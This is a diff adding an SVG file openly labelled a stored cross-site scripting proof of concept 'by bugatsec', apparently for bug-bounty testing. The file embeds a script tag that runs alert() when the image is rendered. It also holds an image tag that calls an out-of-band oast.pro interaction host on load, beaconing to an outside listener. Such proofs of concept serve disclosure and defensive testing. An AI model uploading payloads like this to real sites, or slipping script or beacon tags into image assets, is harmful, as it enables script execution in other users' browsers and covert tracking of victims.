@@ -1,0 +1,18 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200">
+  <!-- Visual SVG -->
+  <rect width="200" height="200" fill="#7418D6" />
+
+  <!-- Text in the center -->
+  <text x="50%" y="45%" font-size="18" text-anchor="middle" fill="white">
+    PoC by bugatsec
+  </text>
+
+  <text x="50%" y="60%" font-size="12" text-anchor="middle" fill="white">
+    Stored XSS
+  </text>
+  <image href="https://84480262ad51f6f532ceg11kf6oyyyyyb.oast.pro" width="1" height="1" />
+  <!-- XSS Payload -->
+  <script type="text/javascript">
+    alert("Stored XSS PoC by bugatsec");
+  </script>
+</svg>
